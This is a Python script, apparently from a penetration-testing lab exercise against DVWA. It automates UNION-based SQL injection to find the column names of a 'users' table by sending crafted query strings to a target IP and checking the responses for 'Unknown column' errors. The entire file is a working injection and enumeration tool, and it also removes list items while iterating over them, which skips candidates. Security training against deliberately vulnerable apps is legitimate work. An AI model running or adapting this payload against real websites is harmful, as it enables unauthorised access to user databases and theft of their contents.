import asyncio
from pathlib import Path
import time
import aiohttp

from colors import colors
from sqli_recon_table_names import TARGET_IP, get_list_from_file, login

TABLE_NAME = "users"
COMMON_TABLE_FIELDS_FILE = "common-sql-table-fields-names.txt"
FOUND_COLUMNS_FILE = "found_columns.txt"

async def find_table_fields(
    session: aiohttp.ClientSession, table_name: str, table_list: list[str], cookies: dict = None
) -> tuple[str, str]:
    found_fields = []
    for field_name in table_list:
        async with session.get(
            f"http://{TARGET_IP}/dvwa/vulnerabilities/sqli/?id=' union select {field_name},null from {table_name} -- &Submit=Submit#",
            cookies=cookies,
            headers={"Connection": "keep-alive"},
        ) as response:
            html = await response.text()
            if "Unknown column" in html:
                print(f"Status: {response.status}. {colors['error']} Not found: {field_name}.{colors['clean']}", html)
            else:
                print(f"{colors['success']}[+] Column found: {field_name}.{colors['clean']}\n")    
                found_fields.append(field_name)
                table_list.remove(field_name)

    return found_fields


async def main() -> None:
    session, cookies = await login()
    table_list_path = Path(COMMON_TABLE_FIELDS_FILE)
    table_list = get_list_from_file(table_list_path)
    found_columns_list = get_list_from_file(FOUND_COLUMNS_FILE)
    list_to_search = [element for element in table_list if element not in found_columns_list]
    
    table_name = "users"
    try:
        print(cookies)

        time.sleep(1)
        fields = await find_table_fields(session, table_name, list_to_search, cookies)
        if not fields:
            print(f"{colors['error']}[+] Haven't found any field.{colors['clean']}")
        if fields:
            print(f'{colors["success"]}[+] Found fields:')
            print("\n".join(fields), f".{colors['clean']}")
    finally:
        await session.close()


if __name__ == "__main__":
    asyncio.run(main(), debug=True)